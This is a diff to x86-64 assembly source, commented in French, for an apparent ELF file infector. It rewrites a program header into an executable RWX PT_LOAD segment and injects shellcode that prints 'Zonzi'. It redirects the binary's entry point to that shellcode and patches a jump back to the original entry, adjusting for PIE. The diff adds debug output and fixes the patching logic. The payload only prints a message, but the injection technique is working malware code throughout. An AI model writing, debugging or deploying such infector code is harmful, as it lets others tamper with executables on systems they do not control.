@@ -13,35 +13,61 @@ section .data
     signature db "INFECTED", 0     
     sig_len equ $ - signature
 
+    ; Messages de debug
+    debug_original_entry db "Adresse d'entrée originale: 0x", 0
+    debug_patch_addr db "Adresse du patch: 0x", 0
+    debug_vaddr db "Adresse virtuelle calculée: 0x", 0
+    debug_patch_value db "Valeur à patcher avec: 0x", 0
+    debug_new_entry db "Nouveau point d'entrée: 0x", 0
+    debug_newline db 10, 0
+
+    ; Buffer pour conversion hex
+    hex_buffer db "0000000000000000", 10, 0
+    hex_chars db "0123456789ABCDEF"
+
     ; Shellcode position-independent
     shellcode:
-        ; Sauvegarder le contexte minimal nécessaire
+        push rbp                   ; Sauvegarder le frame pointer
+        mov rbp, rsp              ; Créer un nouveau frame
+        
+        pushf                     ; Sauvegarder les flags
         push rax
+        push rbx
         push rcx
         push rdx
         push rsi
         push rdi
+        push r8
+        push r9
+        push r10
+        push r11
 
-        ; Appel au message
-        call get_msg
+        ; Obtenir l'adresse du message de manière PIC
+        lea rsi, [rel msg]        ; Utiliser lea avec rel pour le PIC
+        jmp print_msg
     msg:
         db "Zonzi", 10
-    get_msg:
-        ; Afficher le message
-        pop rsi                 ; rsi pointe vers le message
-        mov rax, 1             ; sys_write
-        mov rdi, 1             ; stdout
-        mov rdx, 6             ; longueur
+    print_msg:
+        mov rax, 1              ; sys_write
+        mov rdi, 1              ; stdout
+        mov rdx, 6              ; longueur du message
         syscall
 
-        ; Restaurer le contexte
+        pop r11
+        pop r10
+        pop r9
+        pop r8
         pop rdi
         pop rsi
         pop rdx
         pop rcx
+        pop rbx
         pop rax
+        popf                    ; Restaurer les flags
+        
+        leave                   ; Restaurer rbp et rsp
 
-        ; Saut direct vers l'entrée originale
+        ; Placer l'instruction jmp après le leave pour assurer une pile propre
         db 0x48, 0xb8          ; movabs rax,
         dq 0x0000000000000000  ; adresse à patcher
         jmp rax
@@ -61,6 +87,50 @@ section .bss
 
 section .text
 global _start
+
+; Fonction pour convertir un nombre en hexadécimal
+hex_to_string:
+    push rbx
+    push rcx
+    push rdx
+    push rdi
+    
+    mov rcx, 16         ; 16 caractères à traiter
+    lea rdi, [hex_buffer]
+    
+.loop:
+    rol rax, 4          ; Rotation à gauche de 4 bits
+    mov rdx, rax        
+    and rdx, 0xf        ; Garder uniquement les 4 bits de poids faible
+    lea rbx, [hex_chars]
+    movzx rdx, byte [rbx + rdx]  ; Convertir en caractère hex
+    mov [rdi], dl
+    inc rdi
+    dec rcx
+    jnz .loop
+
+    pop rdi
+    pop rdx
+    pop rcx
+    pop rbx
+    ret
+
+; Fonction pour afficher une chaîne
+print_string:
+    push rax
+    push rdi
+    push rsi
+    push rdx
+    
+    mov rdi, 1          ; stdout
+    mov rax, 1          ; sys_write
+    syscall
+    
+    pop rdx
+    pop rsi
+    pop rdi
+    pop rax
+    ret
 
 _start:
     ; Récupérer le premier argument (nom du fichier)
@@ -203,37 +273,112 @@ modify_header:
     mov rax, qword [elf_header + 24]  
     mov [original_entry_addr], rax
 
-    ; Configurer le segment
+    ; DEBUG: Afficher l'adresse d'entrée originale
+    mov rsi, debug_original_entry
+    mov rdx, 23        
+    call print_string
+    
+    mov rax, [original_entry_addr]
+    call hex_to_string
+    mov rsi, hex_buffer
+    mov rdx, 17        
+    call print_string
+
+    ; Calculer une nouvelle adresse virtuelle basée sur un multiple de la page et configure le segment
     mov dword [phdr], 1                ; PT_LOAD
     mov dword [phdr + 4], 7            ; PF_R | PF_W | PF_X
 
-    ; Calculer l'adresse virtuelle (garder l'alignement original)
-    mov rax, qword [phdr + 8]          ; p_offset
-    mov qword [phdr + 16], rax         ; p_vaddr = p_offset
-    mov qword [phdr + 24], rax         ; p_paddr = p_offset
+    ; Utiliser une adresse plus éloignée des bibliothèques dynamiques
+    mov rax, 0x8000000                 ; 128MB offset
+    mov qword [phdr + 16], rax         ; p_vaddr
+    mov qword [phdr + 24], rax         ; p_paddr
+
+    ; Calculer l'offset après tous les segments existants
+    mov rax, 0x4000                    ; Offset suffisamment grand
+    mov qword [phdr + 8], rax          ; p_offset
+
+    ; Configurer les tailles et l'alignement
+    mov qword [phdr + 32], shellcode_len  ; p_filesz
+    mov qword [phdr + 40], shellcode_len  ; p_memsz
     mov qword [phdr + 48], 0x1000      ; p_align
 
-    ; Copier le shellcode
+    ; Mise à jour du point d'entrée pour pointer vers notre nouveau segment
+    mov rax, qword [phdr + 16]         ; p_vaddr
+    mov qword [elf_header + 24], rax   ; e_entry = p_vaddr
+
+    ; DEBUG: Afficher l'adresse virtuelle calculée
+    push rax
+    mov rsi, debug_vaddr
+    mov rdx, 25        
+    call print_string
+    
+    mov rax, qword [phdr + 16]
+    call hex_to_string
+    mov rsi, hex_buffer
+    mov rdx, 17        
+    call print_string
+    pop rax
+
+    ; Copier le shellcode dans le buffer
     mov rdi, note_data
     mov rsi, shellcode
     mov rcx, shellcode_len
     rep movsb
 
-    ; Patcher l'adresse de retour dans le shellcode
-    mov rax, [original_entry_addr]      ; Adresse originale
-    mov rdi, note_data                  ; Base du shellcode
-    mov rcx, shellcode_len             
-    sub rcx, 10                         ; Position du mov rax, 0
-    add rdi, rcx
-    mov [rdi], rax                      ; Écrire l'adresse originale dans shellcode
+    ; Trouver l'instruction movabs dans le shellcode
+    mov rdi, note_data                 ; Base du shellcode
+    mov rcx, shellcode_len
+    sub rcx, 10                        ; Taille minimale pour l'instruction + adresse
+    
+find_movabs:
+    cmp byte [rdi], 0x48              ; Premier byte de movabs
+    je check_second_byte
+    inc rdi
+    loop find_movabs
+    jmp exit                          ; Si non trouvé, sortir
+    
+check_second_byte:
+    cmp byte [rdi + 1], 0xb8          ; Deuxième byte de movabs
+    je found_movabs
+    inc rdi
+    loop find_movabs
+    jmp exit
+    
+found_movabs:
+    add rdi, 2                        ; Pointer après movabs
+    
+    ; DEBUG: Afficher l'adresse du patch
+    push rdi
+    mov rsi, debug_patch_addr
+    mov rdx, 19
+    call print_string
+    
+    mov rax, rdi
+    call hex_to_string
+    mov rsi, hex_buffer
+    mov rdx, 17
+    call print_string
 
-    ; Mettre à jour les tailles du segment
-    mov qword [phdr + 32], shellcode_len  ; p_filesz
-    mov qword [phdr + 40], shellcode_len  ; p_memsz
+    ; DEBUG: Afficher la valeur à patcher
+    mov rsi, debug_patch_value
+    mov rdx, 21
+    call print_string
 
-    ; Mettre à jour le point d'entrée  
-    mov rax, qword [phdr + 16]          ; p_vaddr (notre nouveau point d'entrée)
-    mov qword [elf_header + 24], rax    ; e_entry = p_vaddr
+    mov rax, [original_entry_addr]    
+    call hex_to_string
+    mov rsi, hex_buffer
+    mov rdx, 17
+    call print_string
+
+    ; Effectuer le patch avec l'adresse corrigée pour PIE
+    pop rdi
+
+    ; Trouver la base PIE en utilisant le premier segment LOAD
+    mov rax, [phdr + 16]              ; Première adresse virtuelle du segment LOAD
+    mov rdx, [phdr + 8]               ; Premier offset du segment
+    sub rax, rdx                      ; Calculer la base PIE
+    add rax, [original_entry_addr]    ; Ajouter l'offset original
+    mov qword [rdi], rax              ; Patcher l'adresse
 
     ; Écrire l'en-tête ELF modifié
     mov rdi, [fd]
@@ -300,7 +445,7 @@ modify_header:
     syscall
     
     jmp exit
-    
+
 file_already_modified:
     ; Informer que le fichier est déjà modifié
     mov rax, 1              ; sys_write
